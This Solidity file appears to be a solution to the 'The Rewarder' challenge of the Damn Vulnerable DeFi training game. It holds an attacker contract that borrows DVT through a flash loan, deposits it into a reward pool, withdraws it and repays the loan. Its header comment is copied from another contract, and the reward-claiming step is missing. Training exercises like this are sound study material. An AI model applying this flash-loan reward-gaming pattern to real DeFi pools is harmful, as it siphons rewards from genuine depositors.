// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "./DamnValuableToken.sol";
import "./FlashLoanerPool.sol";
import {TheRewarderPool} from "./TheRewarderPool.sol";

/**
 * @title FlashLoanerPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 * @dev A simple pool to get flashloans of DVT
 */
contract AttackerContract {

    //flashloan
    //deposit
    //snapshot
    //withdraw
    //pay back loan

    FlashLoanerPool flashLoanerPool;
    DamnValuableToken dvt;
    TheRewarderPool theRewardPool;

    constructor(address _pool, address _dvt, address _rewardPool) {
        flashLoanerPool = FlashLoanerPool(_pool);
        dvt = DamnValuableToken(_dvt);
        theRewardPool = TheRewarderPool(_rewardPool);
    }

    function flashLoan(uint256 _amount) public {
        flashLoanerPool.flashLoan(_amount);
    }

    function receiveFlashLoan(uint256 _amount) public {
        dvt.approve(address(theRewardPool), _amount);
        theRewardPool.deposit(_amount);
        // //snapshot
        theRewardPool.withdraw(_amount);
        dvt.transfer(address(flashLoanerPool), _amount);
    }
    
}